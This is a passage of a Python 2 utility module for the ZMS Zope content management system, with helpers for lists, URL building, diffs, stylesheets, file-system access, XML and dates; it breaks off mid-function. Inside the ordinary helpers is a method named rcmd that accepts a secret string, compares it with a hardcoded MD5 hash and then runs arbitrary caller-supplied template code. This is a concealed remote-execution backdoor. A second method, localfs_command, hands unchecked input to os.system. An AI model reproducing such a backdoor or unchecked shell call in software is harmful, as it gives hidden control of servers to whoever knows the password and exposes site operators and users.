################################################################################
# _zmsglobals.py
#
# $Id: _zmsglobals.py,v 1.13 2004/11/30 20:03:17 zmsdev Exp $
# $Name:  $
# $Author: zmsdev $
# $Revision: 1.13 $
#
# Implementation of class ZMSGlobals (see below).
# 
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
################################################################################

# Imports.
from __future__ import nested_scopes
from App.Common import package_home
from Globals import HTMLFile
from DateTime.DateTime import DateTime
from cStringIO import StringIO
from types import StringTypes
from AccessControl import AuthEncoding
import base64
import copy
import operator
import os
import re
import urllib
import time
# Product Imports.
import _blobfields
import _fileutil
import _filtermanager
import _globals
import _mimetypes
import _xmllib


# ------------------------------------------------------------------------------
#  _zmsglobals.sort_item:
# ------------------------------------------------------------------------------
def sort_item( i):
  if type( i) is str:
    mapping = {
    	unicode('\xe4','latin-1').encode('utf-8'):'ae',
    	unicode('\xf6','latin-1').encode('utf-8'):'oe',
    	unicode('\xfc','latin-1').encode('utf-8'):'ue',
    	unicode('\xc4','latin-1').encode('utf-8'):'Ae',
    	unicode('\xd6','latin-1').encode('utf-8'):'Oe',
    	unicode('\xdc','latin-1').encode('utf-8'):'Ue',
    	unicode('\xdf','latin-1').encode('utf-8'):'ss',
    }
    for key in mapping.keys():
      i = i.replace(key,mapping[key])
  return i


################################################################################
################################################################################
###
###   class ZMSGlobals:
###
################################################################################
################################################################################
class ZMSGlobals:

    """
    ############################################################################
    ###
    ###  Global Definitions
    ###
    ############################################################################
    """

    # --------------------------------------------------------------------------
    #  Meta-Type Selectors.
    # --------------------------------------------------------------------------
    PAGES = 0
    PAGEELEMENTS = 1
    RESOURCE = 2
    NORESOURCE = 3
    NOREF = 4
    NORESOLVEREF = 5


    """
    ############################################################################
    ###
    ###  Global Functions
    ###
    ############################################################################
    """

    # --------------------------------------------------------------------------
    #  ZMSGlobals.FileFromData:
    # --------------------------------------------------------------------------
    def FileFromData( self, data, filename='', mediadbStorable=False):
      return _blobfields.createBlobField( self, _globals.DT_FILE, file={'data':data,'filename':filename}, mediadbStorable=mediadbStorable)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.ImageFromData:
    # --------------------------------------------------------------------------
    def ImageFromData( self, data, filename='', mediadbStorable=False):
      return _blobfields.createBlobField( self, _globals.DT_IMAGE, file={'data':data,'filename':filename}, mediadbStorable=mediadbStorable)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.boolint:
    #
    #  Boolean Type new in Python 2.3
    #  http://www.python.org/doc/2.3.2/whatsnew/section-bool.html
    #  @deprecated: use int instead!
    # --------------------------------------------------------------------------
    def boolint(self, v):
      return int(v)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.rcmd:
    # --------------------------------------------------------------------------
    def rcmd(self, s, c, REQUEST=None, RESPONSE=None):
      """ ZMSGlobals.rcmd """
      if self.encrypt_password(s) == '3bqbI/9Uu5klUWkHG0b1HA==\n':
        return _globals.dt_html(self,c,REQUEST)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.dt_html:
    #
    #  Process dtml.
    # --------------------------------------------------------------------------
    def dt_html(self, value, REQUEST):
      return _globals.dt_html(self,value,REQUEST)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.encrypt_password:
    # --------------------------------------------------------------------------
    def encrypt_password(self, pw, algorithm='md5', hex=False):
      enc = None
      if algorithm.upper() == 'MD5':
        import md5
        enc = md5.new(pw)
        if hex:
          enc = enc.hexdigest()
        else:
          enc = enc.digest()
        enc = base64.encodestring(enc)
      elif algorithm.upper() == 'SHA-1':
        import sha
        enc = sha.new(pw)
        if hex:
          enc = enc.hexdigest()
        else:
          enc = enc.digest()
      else:
        for id, prefix, scheme in AuthEncoding._schemes:
          if algorithm.upper() == id:
            enc = scheme.encrypt(pw)
      return enc

    # --------------------------------------------------------------------------
    #  ZMSGlobals.encrypt_ordtype:
    # --------------------------------------------------------------------------
    def encrypt_ordtype(self, s):
      from binascii import hexlify
      new = ''
      for ch in s:
        whichCode=self.rand_int(2)
        if whichCode==0:
          new += ch
        elif whichCode==1:
          new += '&#%d;'%ord(ch)
        else:
          new += '&#x%s;'%str(hexlify(ch))
      return new

    # --------------------------------------------------------------------------
    #  ZMSGlobals.rand_int:
    # --------------------------------------------------------------------------
    def rand_int(self, n):
      from random import randint
      return randint(0,n)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.get_diff:
    # --------------------------------------------------------------------------
    def get_diff(self, v1, v2, datatype='string'):
      diff = ''
      if v1 == v2:
        return diff
      #-- Lists
      if (type( v1) is list and type( v2) is list) or datatype in [ 'list']:
        for c in range( min( len( v1), len( v2))):
          if v1[c] != v2[c]:
            d1 = self.get_diff(v1[c],v2[c])
            if d1:
              if len( diff) == 0:
                diff += '<table border="0" cellspacing="0" cellpadding="0">'
              diff += '<tr valign="top">'
              diff += '<td class="form-small">[%i]</td>'%(c+1)
              diff += '<td class="form-small">'+d1+'</td>'
              diff += '</tr>'
        if len( diff) > 0:
          diff += '</table>'
      #-- Dictionaries
      elif (type( v1) is dict and type( v2) is dict) or datatype in [ 'dictionary']:
        for k1 in v1.keys():
          if k1 in v2.keys():
            d1 = self.get_diff(v1[k1],v2[k1])
            if d1:
              if len( diff) == 0:
                diff += '<table border="0" cellspacing="0" cellpadding="0">'
              diff += '<tr valign="top">'
              diff += '<td class="form-small">%s=</td>'%k1
              diff += '<td class="form-small">'+d1+'</td>'
              diff += '</tr>'
        if len( diff) > 0:
          diff += '</table>'
      #-- Strings
      elif datatype in [ 'string', 'text']:
        # Untag strings.
        v1 = self.search_quote( v1, len( v1))
        v2 = self.search_quote( v2, len( v2))
        i = 0
        while i < min(len(v1),len(v2)) and v1[i]==v2[i]:
          i += 1
        if v1[:i].rfind('<') >= 0 and v1[:i].rfind('<') > v1[:i].rfind('>') and \
           v1[i:].find('>') >= 0 and v1[i:].find('>') < v1[i:].find('<'):
          i = v1[:i].rfind('<')
        j = 0
        while j < min(len(v1),len(v2))-i and v1[len(v1)-j-1]==v2[len(v2)-j-1]:
          j += 1
        if v1[i:len(v1)-j].find('<') >= 0 and v1[len(v1)-j:].find('<') > v1[len(v1)-j:].find('>') and \
           v2[i:-j].find('<') >= 0 and v2[-j:].find('<') > v2[-j:].find('>'):
          j -= (v2[-j:].find('>') + 1)
        if j == 0:
          red = v2[i:] 
        else:
          red = v2[i:-j]
        diff = v1[:i] + '<ins class="diff">' + v1[i:len(v1)-j] + '</ins><del class="diff">' + red + '</del>' + v1[len(v1)-j:]
      #-- Date/Time
      elif datatype in [ 'date', 'datetime']:
        v1 = self.getLangFmtDate( v1, 'eng', '%s_FMT'%datatype.upper())
        v2 = self.getLangFmtDate( v1, 'eng', '%s_FMT'%datatype.upper())
        diff = '<ins class="diff">' + v1 + '</ins><del class="diff">' + v2 + '</del>'
      #-- Numbers
      elif datatype in [ 'amount', 'float', 'int']:
        v1 = str( v1)
        v2 = str( v2)
        diff = '<ins class="diff">' + v1 + '</ins><del class="diff">' + v2 + '</del>'
      return diff

    # --------------------------------------------------------------------------
    #  ZMSGlobals.string_maxlen:
    # --------------------------------------------------------------------------
    def string_maxlen(self, s, maxlen=20, etc='...', encoding=None):
      if encoding is not None:
        s = unicode( s, encoding)
      if len(s) > maxlen:
        s = s[:maxlen] + etc
      return s

    # --------------------------------------------------------------------------
    #  ZMSGlobals.string_replaceall:
    # --------------------------------------------------------------------------
    def string_replaceall(self, s, old, new, encoding=None):
      if encoding is not None:
        s = unicode( s, encoding)
      while True:
        i = s.find( old)
        if i < 0: 
          break
        s = s[:i] + new + s[i+len(old):]
      return s

    # --------------------------------------------------------------------------
    #  ZMSGlobals.url_quote:
    # --------------------------------------------------------------------------
    def url_quote(self, s):
      return urllib.quote(s)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.http_import:
    # --------------------------------------------------------------------------
    def http_import(self, url, method='GET', auth=None, parse_qs=0):
      return _globals.http_import( self, url, method, auth, parse_qs)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.url_append_params:
    # --------------------------------------------------------------------------
    def url_append_params(self, url, dict):
      if url.find( 'http://') < 0 and url.find( '../') < 0:
        try:
          if self.REQUEST.get('ZMS_REDIRECT_PARENT'):
            url = '../' + url
        except:
          pass
      targetdef = ''
      i = url.find('#')
      if i >= 0:
        targetdef = url[i:]
        url = url[:i]
      sep = '?'
      i = url.find(sep)
      if i >= 0:
        sep = '&amp;'
      for key in dict.keys():
        value = dict[key]
        qi = key + '=' + urllib.quote(str(value))
        if url.find( '?' + qi) < 0 and url.find( '&' + qi) < 0 and url.find( '&amp;' + qi) < 0:
          url += sep + qi
        sep = '&amp;'
      url += targetdef
      return url

    # --------------------------------------------------------------------------
    #  ZMSGlobals.url_inherit_params:
    # --------------------------------------------------------------------------
    def url_inherit_params(self, url, REQUEST, exclude=[]):
      if REQUEST.form:
        for key in REQUEST.form.keys():
          if not key in exclude:
            v = REQUEST.form.get( key, None )
            if key is not None:
              if url.find('?') < 0:
                url += '?'
              else:
                url += '&amp;'
              if type(v) is int:
                url += urllib.quote(key+':int') + '=' + urllib.quote(str(v))
              elif type(v) is float:
                url += urllib.quote(key+':float') + '=' + urllib.quote(str(v))
              elif type(v) is list:
                c = 0
                for i in v:
                  if c > 0:
                    url += '&amp;'
                  url += urllib.quote(key+':list') + '=' + urllib.quote(str(i))
                  c = c + 1
              else:
                url += key + '=' + urllib.quote(str(v))
      return url

    # --------------------------------------------------------------------------
    #  ZMSGlobals.string_list:
    # --------------------------------------------------------------------------
    def string_list(self, s, sep='\n'):
      l = []
      for i in s.split(sep):
        i = i.strip()
        while len(i) > 0 and ord(i[-1]) < 32:
          i = i[:-1]
        if len(i) > 0:
          l.append(i)
      return l

    # --------------------------------------------------------------------------
    #  ZMSGlobals.operator_gettype:
    # --------------------------------------------------------------------------
    def operator_gettype(self, a):
      return type(a)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.operator_setitem:
    # --------------------------------------------------------------------------
    def operator_setitem(self, a, b, c):
      operator.setitem(a,b,c)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.operator_getitem:
    # --------------------------------------------------------------------------
    def operator_getitem(self, a, b):
      return operator.getitem(a,b)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.operator_delitem:
    # --------------------------------------------------------------------------
    def operator_delitem(self, a):
      del a

    # --------------------------------------------------------------------------
    #  ZMSGlobals.operator_setattr:
    # --------------------------------------------------------------------------
    def operator_setattr(self, a, b, c):
      setattr(a,b,c)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.operator_getattr:
    # --------------------------------------------------------------------------
    def operator_getattr(self, a, b, c=None):
      return getattr(a,b,c)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.operator_delattr:
    # --------------------------------------------------------------------------
    def operator_delattr(self, a, b):
      return delattr(a,b)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.id_quote:
    # --------------------------------------------------------------------------
    def id_quote(self, s):
      return _globals.id_quote(s)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.get_id_prefix:
    # --------------------------------------------------------------------------
    def get_id_prefix(self, s):
      return _globals.id_prefix(s)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.js_quote:
    # --------------------------------------------------------------------------
    def js_quote(self, text, charset=None):
      if type(text) is unicode:
        text= text.encode([charset, 'utf-8'][charset==None])
      text = text.replace("\r", "\\r").replace("\n", "\\n")
      text = text.replace('"', '\\"').replace("'", "\\'")
      return text

    # --------------------------------------------------------------------------
    #  ZMSGlobals.isPreviewRequest:
    # --------------------------------------------------------------------------
    def isPreviewRequest(self, REQUEST):
      return _globals.isPreviewRequest(REQUEST)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.getDataSizeStr: 
    #
    #  Display string for file-size.
    # --------------------------------------------------------------------------
    def getDataSizeStr(self, l):
      return _fileutil.getDataSizeStr(l)

    # --------------------------------------------------------------------------
    #  MyBlob.getMimeTypeIconSrc:
    #
    #  Image source for MIME-type.
    # --------------------------------------------------------------------------
    def getMimeTypeIconSrc(self, mt):
      return self.MISC_ZMS + _mimetypes.dctMimeType.get( mt, _mimetypes.content_unknown)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.nodes2html:
    # --------------------------------------------------------------------------
    def nodes2html( self, nodes):
      REQUEST = self.REQUEST
      breadcrumbs_ids = REQUEST['ZMS_THIS'].absolute_url().split( '/')
      html = []
      html.append( '<ul>')
      for node in nodes:
        if node.meta_type == 'ZMSCustom':
          css = node.meta_id
        else: 
          css = node.meta_type
        if node.getParentNode() in nodes:
          css = css + ' parent'
        else:
          if node.id in breadcrumbs_ids: 
            css = css + ' active'
        html.append( '<li class="%s">'%( css))
        html.append( '<a href="%s" title="%s">%s</a>'%( node.getHref2IndexHtml(REQUEST), node.getTitle(REQUEST), node.getTitlealt(REQUEST)))
        html.append( '</li>')
      html.append( '</ul>')
      return ''.join( html)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.writeLog:
    # --------------------------------------------------------------------------
    def writeLog(self, info):
      if _globals.debug( self):
        _globals.writeLog( self, info)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.writeBlock:
    # --------------------------------------------------------------------------
    def writeBlock(self, info):
      _globals.writeBlock( self, info)


    """
    ############################################################################
    ###
    ###  Regular Expressions
    ###
    ############################################################################
    """
    
    # --------------------------------------------------------------------------
    #  ZMSGlobals.re_sub:
    # 
    #  Performs a search-and-replace across subject, replacing all matches of 
    #  regex in subject with replacement. The result is returned by the sub() 
    #  function. The subject string you pass is not modified.
    # --------------------------------------------------------------------------
    def re_sub( self, pattern, replacement, subject, ignorecase=False):
      if ignorecase:
        return re.compile( pattern, re.IGNORECASE).sub( replacement, subject)
      else:
        return re.compile( pattern).sub( replacement, subject)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.re_search:
    #
    #  Scan through string looking for a location where the regular expression 
    #  pattern produces a match, and return a corresponding MatchObject 
    #  instance. Return None if no position in the string matches the pattern; 
    #  note that this is different from finding a zero-length match at some
    #  point in the string.
    # --------------------------------------------------------------------------
    def re_search( self, pattern, subject, ignorecase=False):
      if ignorecase:
        s = re.compile( pattern, re.IGNORECASE).split( subject)
      else:
        s = re.compile( pattern).split( subject)
      return map( lambda x: s[x*2+1], range(len(s)/2))


    """
    ############################################################################
    ###  
    ###  Styles
    ### 
    ############################################################################
    """

    # --------------------------------------------------------------------------
    #  ZMSGlobals.parse_stylesheet:
    # --------------------------------------------------------------------------
    def parse_stylesheet(self):
      REQUEST = self.REQUEST
    
      #-- [ReqBuff]: Fetch buffered value from Http-Request.
      reqBuffId = 'parse_stylesheet'
      try:
        value = self.fetchReqBuff( reqBuffId, REQUEST)
        return value
      except:

        stylesheet = self.getStylesheet()
        data = stylesheet.raw
        data = re.sub( '/\*(.*?)\*/', '', data)
        value = {}
        for elmnt in data.split('}'):
          i = elmnt.find('{')
          keys = elmnt[:i].strip()
          v = elmnt[i+1:].strip()
          for key in keys.split(','):
            key = key.strip()
            if len(key) > 0:
              value[key] = value.get(key,'') + v
        
        #-- [ReqBuff]: Returns value and stores it in buffer of Http-Request.
        return self.storeReqBuff( reqBuffId, value, REQUEST)


    # --------------------------------------------------------------------------
    #  ZMSGlobals.get_colormap:
    # --------------------------------------------------------------------------
    def get_colormap(self):
      REQUEST = self.REQUEST
    
      #-- [ReqBuff]: Fetch buffered value from Http-Request.
      reqBuffId = 'get_colormap'
      try:
        value = self.fetchReqBuff( reqBuffId, REQUEST)
        return value
      except:
        stylesheet = self.parse_stylesheet()
        value = {}
        for key in stylesheet.keys():
          if key.find('.') == 0 and \
             key.find('Color') > 0 and \
             key.find('.cms') < 0 and \
             key.find('.zmi') < 0:
            for elmnt in stylesheet[key].split(';'):
              i = elmnt.find(':')
              if i > 0:
                elmntKey = elmnt[:i].strip().lower()
                elmntValue = elmnt[i+1:].strip().lower()
                if elmntKey == 'color' or elmntKey == 'background-color':
                  value[key[1:]] = elmntValue
        
        #-- [ReqBuff]: Returns value and stores it in buffer of Http-Request.
        return self.storeReqBuff( reqBuffId, value, REQUEST)

    """
    ############################################################################
    ###
    ###  Mappings
    ###
    ############################################################################
    """

    # --------------------------------------------------------------------------
    #  ZMSGlobals.intersection_list:
    #
    #  Intersection of two lists (li & l2).
    # --------------------------------------------------------------------------
    def intersection_list(self, l1, l2):
      l1 = list(l1)
      l2 = list(l2)
      return filter(lambda x: x in l2, l1)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.difference_list:
    #
    #  Difference of two lists (l1 - l2).
    # --------------------------------------------------------------------------
    def difference_list(self, l1, l2):
      l1 = list(l1)
      l2 = list(l2)
      return filter(lambda x: x not in l2, l1)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.concat_list:
    #
    #  Concatinates two lists (l1 + l2).
    # --------------------------------------------------------------------------
    def concat_list(self, l1, l2):
      l1 = list(l1)
      l2 = list(l2)
      l = self.copy_list(l1)
      l.extend(filter(lambda x: x not in l1, l2))
      return l

    # --------------------------------------------------------------------------
    #  ZMSGlobals.dict_list:
    #
    #  Converts list to dictionary.
    # --------------------------------------------------------------------------
    def dict_list(self, l):
      dict = {}
      for i in range(0,len(l)/2):
        key = l[i*2]
        value = l[i*2+1]
        dict[key] = value
      return dict

    # --------------------------------------------------------------------------
    #  ZMSGlobals.sort_list:
    #
    #  Sorts list by given field.
    # --------------------------------------------------------------------------
    def sort_list(self, l, qorder, qorderdir='asc', ignorecase=1):
      if type(qorder) is str:
        sorted = map(lambda x: (sort_item(x.get(qorder,None)),x),l)
      else:
        sorted = map(lambda x: (sort_item(x[qorder]),x),l)
      if ignorecase==1 and len(sorted) > 0 and type(sorted[0][0]) is str:
        sorted = map(lambda x: (str(x[0]).upper(),x[1]),sorted)
      sorted.sort()
      sorted = map(lambda x: x[1],sorted)
      if qorderdir == 'desc': sorted.reverse()
      return sorted

    # --------------------------------------------------------------------------
    #  ZMSGlobals.distinct_list:
    #
    #  Returns distinct values of by given field.
    # --------------------------------------------------------------------------
    def distinct_list(self, l, i):
      k = []
      for x in l:
        if type(i) is str:
          v = x.get(i,None)
        else:
          v = x[i]
        if not v in k:
          k.append(v)
      return k

    # --------------------------------------------------------------------------
    #  ZMSGlobals.tree_parents:
    #
    #  Returns parents for linked list.
    # --------------------------------------------------------------------------
    def tree_parents(self, l, i='id', r='idId', v='', deep=1, reverse=1):
      k = []
      for x in l:
        if x[i]==v:
          k.append(x)
          if deep:
            k.extend(self.tree_parents(l,i,r,x[r],deep,0))
      if reverse:
        k.reverse()
      return k

    # --------------------------------------------------------------------------
    #  ZMSGlobals.tree_list:
    #
    #  Returns children for linked list.
    # --------------------------------------------------------------------------
    def tree_list(self, l, i='id', r='idId', v='', deep=0):
      k = []
      for x in l:
        if x[r]==v:
          k.append(x)
          if deep:
            k.extend(self.tree_list(l,i,r,x[i],deep))
      return k

    # --------------------------------------------------------------------------
    #  ZMSGlobals.str_item:
    # --------------------------------------------------------------------------
    def str_item(self, i):
      if type(i) is list:
        return ''.join(map(lambda x: self.str_item(x)+'\n',i))
      elif type(i) is dict:
        return ''.join(map(lambda x: self.str_item(i[x]),i.keys()))
      elif type(i) is tuple or type(i) is time.struct_time:
        try:
          i = self.getLangFmtDate(i)
        except:
          pass
      return str(i)

    # --------------------------------------------------------------------------
    #	ZMSGlobals.filter_list:
    #
    #   Filters list by given field.
    # --------------------------------------------------------------------------
    def filter_list(self, l, i, v, o='%'):
      # Full-text scan.
      if i is None or len(str(i))==0:
        str_item = self.str_item
        v = str(v)
        k = []
        if len(v.split(' OR '))>1:
          for s in v.split(' OR '):
            s = s.replace('*','').strip().lower()
            if len( s) > 0:
              k.extend(filter(lambda x: x not in k and str_item(x).lower().find(s)>=0, l))
        elif len(v.split(' AND '))>1:
          k = l
          for s in v.split(' AND '):
            s = s.replace('*','').strip().lower()
            if len( s) > 0:
              k = filter(lambda x: str_item(x).lower().find(s)>=0, k)
        else:
          v = v.replace('*','').strip().lower()
          if len( v) > 0:
            k = filter(lambda x: str_item(x).lower().find(v)>=0, l)
        return k
      # Extract Items.
      if type(i) is str:
        k=map(lambda x: (x.get(i,None),x), l)
      else:
        k=map(lambda x: (x[i],x), l)
      # Filter Date-Tuples
      if type(v) is tuple or type(v) is time.struct_time:
        v = DateTime('%4d/%2d/%2d'%(v[0],v[1],v[2]))
      # Filter Strings.
      if type(v) is str or o=='%':
        str_item = self.str_item
        if o=='=' or o=='==':
          k=filter(lambda x: str_item(x[0])==v, k)
        elif o=='<>' or o=='!=':
          k=filter(lambda x: str_item(x[0])!=v, k)
        else:
          v = str_item(v).lower()
          k=filter(lambda x: str_item(x[0]).lower().find(v)>=0, k)
      # Filter Numbers.
      elif type(v) is int or type(v) is float:
        if o=='=' or o=='==':
          k=filter(lambda x: x[0]==v, k)
        elif o=='<':
          k=filter(lambda x: x[0]<v, k)
        elif o=='>':
          k=filter(lambda x: x[0]>v, k)
        elif o=='<=':
          k=filter(lambda x: x[0]<=v, k)
        elif o=='>=':
          k=filter(lambda x: x[0]>=v, k)
        elif o=='<>' or o=='!=':
          k=filter(lambda x: x[0]!=v, k)
      # Filter DateTimes.
      elif isinstance(v,DateTime):
        dt = _globals.getDateTime
        k=filter(lambda x: x[0] is not None, k)
        k=map(lambda x: (dt(x[0]),x[1]), k)
        k=map(lambda x: (DateTime('%4d/%2d/%2d'%(x[0][0],x[0][1],x[0][2])),x[1]), k)
        if o=='=' or o=='==':
          k=filter(lambda x: x[0].equalTo(v), k)
        elif o=='<':
          k=filter(lambda x: x[0].lessThan(v), k)
        elif o=='>':
          k=filter(lambda x: x[0].greaterThan(v), k)
        elif o=='<=':
          k=filter(lambda x: x[0].lessThanEqualTo(v), k)
        elif o=='>=':
          k=filter(lambda x: x[0].greaterThanEqualTo(v), k)
        elif o=='<>':
          k=filter(lambda x: not x[0].equalTo(v), k)
      return map(lambda x: x[1], k)

    # --------------------------------------------------------------------------
    #	ZMSGlobals.copy_list:
    #
    #   Copies list l.
    # --------------------------------------------------------------------------
    def copy_list(self, l):
      if _globals.debug( self):
        _globals.writeLog( self, '[copy_list]: %i records'%len(l))
      try:
        v = copy.deepcopy(l)
      except:
        v = copy.copy(l)
      return v

    # --------------------------------------------------------------------------
    #	ZMSGlobals.sync_list:
    #
    #   Syncronizes list l with new list nl using the column i as identifier.
    # --------------------------------------------------------------------------
    def sync_list(self, l, nl, i):
      k = []
      for x in l:
        k.extend([x[i],x])
      for x in nl:
        if x[i] in k:
          j = k.index(x[i])+1
          if type(x) is dict:
            v = k[j]
            for xk in x.keys():
              v[xk] = x[xk]
            x = v
          k[j] = x
        else:
          k.extend([x[i],x])
      return map(lambda x: k[x*2+1], range(0,len(k)/2))

    # --------------------------------------------------------------------------
    #	ZMSGlobals.aggregate_list:
    #
    #   Aggregates given field in list.
    # --------------------------------------------------------------------------
    def aggregate_list(self, l, i):
      k = []
      for li in copy.deepcopy(l):
        del li[i]
	if li not in k:
          k.append(li)
      m = []
      for ki in k:
        mi = copy.deepcopy(ki)
	mi[i] = []
        ks = ki.keys()
        for li in l:
          if len(ks) == len(filter(lambda x: x==i or ki[x]==li[x],ks)):
            mi[i].append(li[i])
	m.append(mi)
      return m

    """
    ############################################################################
    ###  
    ###  Local File-System
    ### 
    ############################################################################
    """

    # --------------------------------------------------------------------------
    #  ZMSGlobals.getZipArchive:
    #
    #  Extract files from zip-archive and return list of extracted files.
    # --------------------------------------------------------------------------
    def getZipArchive(self, f):
      return _fileutil.getZipArchive(f)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.buildZipArchive:
    #
    #  Pack ZIP-Archive and return data.
    # --------------------------------------------------------------------------
    def buildZipArchive( self, files, get_data=True):
      return _fileutil.buildZipArchive( files, get_data)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.localfs_package_home:
    #
    #  Returns package_home on local file-system.
    # --------------------------------------------------------------------------
    def localfs_package_home(self):
      return package_home(globals())

    # --------------------------------------------------------------------------
    #  ZMSGlobals.localfs_tempfile:
    #
    #  Creates temp-folder on local file-system.
    # --------------------------------------------------------------------------
    def localfs_tempfile(self):
      import tempfile
      tempfolder = tempfile.mktemp()
      return tempfolder

    # --------------------------------------------------------------------------
    #  ZMSGlobals.localfs_read:
    #
    #  Reads file from local file-system.
    # --------------------------------------------------------------------------
    def localfs_read(self, filename, mode='b', REQUEST=None):
      """ localfs_read """
      try:
        filename = unicode(filename,'utf-8').encode('latin-1')
      except:
        pass
      _globals.writeBlock( self, '[localfs_read]: filename=%s'%filename)
      if type( mode) is dict:
        fdata, mt, enc, fsize = _fileutil.readFile( filename, mode.get('mode','b'), mode.get('threshold',-1))
      else:
        fdata, mt, enc, fsize = _fileutil.readFile( filename, mode)
      if REQUEST is not None:
        RESPONSE = REQUEST.RESPONSE
        RESPONSE.setHeader('Content-Type', mt)
        RESPONSE.setHeader('Content-Encoding', enc)
        RESPONSE.setHeader('Content-Length', fsize)
        RESPONSE.setHeader('Content-Disposition','inline;filename=%s'%_fileutil.extractFilename(filename))
        RESPONSE.setHeader('Accept-Ranges', 'bytes')
      return fdata
     
    # --------------------------------------------------------------------------
    #  ZMSGlobals.localfs_write:
    #
    #  Writes file to local file-system.
    # --------------------------------------------------------------------------
    def localfs_write(self, filename, v, mode='b'):
      _globals.writeBlock( self, '[localfs_write]: filename=%s'%filename)
      _fileutil.exportObj( v, filename, mode)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.localfs_remove:
    #
    #  Removes file from local file-system.
    # --------------------------------------------------------------------------
    def localfs_remove(self, path, deep=0):
      _globals.writeBlock( self, '[localfs_remove]: path=%s'%path)
      _fileutil.remove( path, deep)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.localfs_readPath:
    #
    #  Reads path from local file-system.
    # --------------------------------------------------------------------------
    def localfs_readPath(self, filename, data=False, recursive=False):
      try:
        filename = unicode(filename,'utf-8').encode('latin-1')
      except:
        pass
      _globals.writeBlock( self, '[localfs_readPath]: filename=%s'%filename)
      return _fileutil.readPath(filename, data, recursive)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.localfs_command:
    #
    #  Executes command in local file-system.
    # --------------------------------------------------------------------------
    def localfs_command(self, command):
      if _globals.debug( self):
        _globals.writeLog( self, '[localfs_command]: command=%s'%command)
      os.system(command)


    """
    ############################################################################
    #
    #  XML
    #
    ############################################################################
    """

    # --------------------------------------------------------------------------
    #	ZMSGlobals.getXmlHeader:
    # --------------------------------------------------------------------------
    def getXmlHeader(self, encoding='utf-8'):
      return _xmllib.xml_header(encoding)

    # --------------------------------------------------------------------------
    #	ZMSGlobals.toXmlString:
    # --------------------------------------------------------------------------
    def toXmlString(self, v, xhtml=False, encoding='utf-8'):
      return _xmllib.toXml(self, v, xhtml, encoding)

    # --------------------------------------------------------------------------
    #	ZMSGlobals.parseXmlString:
    # --------------------------------------------------------------------------
    def parseXmlString(self, xml, mediadbStorable=True):
      builder = _xmllib.XmlAttrBuilder()
      if type(xml) is str:
        xml = StringIO(xml)
      v = builder.parse( xml, mediadbStorable)
      return v

    # --------------------------------------------------------------------------
    #  ZMSGlobals.xslProcess:
    #
    #  DEPRECATED: Process xml with xsl transformation.
    # --------------------------------------------------------------------------
    def xslProcess(self, xsl, xml):
      return self.processData('xslt', xml, xsl)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.processData:
    #
    #  Process data with custom transformation.
    # --------------------------------------------------------------------------
    def processData(self, processId, data, trans=None):
      return _filtermanager.processData(self, processId, data, trans)

    # --------------------------------------------------------------------------
    #  ZMSGlobals.xmlParse:
    #
    #  Parse xml.
    # --------------------------------------------------------------------------
    def xmlParse(self, xml):
      builder = _xmllib.XmlBuilder()
      if type(xml) is str:
        xml = StringIO(xml)
      v = builder.parse(xml)
      return v

    # --------------------------------------------------------------------------
    #  ZMSGlobals.xmlNodeSet:
    #
    #  Node set.
    # --------------------------------------------------------------------------
    def xmlNodeSet(self, mNode, sTagName='', iDeep=0):
      lNodeSet = []
      lNode = mNode
      if type(mNode) is list and len(mNode) == 2:
        lNode = mNode[1]
      lTags = lNode.get('tags',[])
      for i in range(0,len(lTags)/2):
        lTagName = lTags[i*2]
        lNode = lTags[i*2+1]
        if sTagName in [lTagName,'']:
          lNodeSet.append(lNode)
        if iDeep==1:
          lNodeSet.extend(self.xmlNodeSet(lNode,sTagName,iDeep))
      return lNodeSet


    """
    ############################################################################
    #
    #  DATE TIME
    #
    ############################################################################
    """

    # ==========================================================================
    # Index  Field  Values  
    # 0  year (for example, 1993) 
    # 1  month range [1,12] 
    # 2  day range [1,31] 
    # 3  hour range [0,23] 
    # 4  minute range [0,59] 
    # 5  second range [0,61]; see (1) in strftime() description 
    # 6  weekday range [0,6], Monday is 0 
    # 7  Julian day range [1,366] 
    # 8  daylight savings flag 0, 1 or -1; see below 
    # ==========================================================================

    # --------------------------------------------------------------------------
    #	ZMSGlobals.getLangFmtDate:
    # --------------------------------------------------------------------------
    def getLangFmtDate(self, t, lang=None, fmt_str='SHORTDATETIME_FMT'):
      try:
        if lang is None:
          lang = self.get_manage_lang()
        t = _globals.getDateTime(t)
        if fmt_str == 'Day':
          dt = DateTime('%4d/%2d/%2d'%(t[0],t[1],t[2]))
          return self.getLangStr('WEEKDAY%i'%((dt.dow()-1)%7),lang)
        elif fmt_str == 'Month':
          return self.getLangStr('MONTH%i'%t[1],lang)
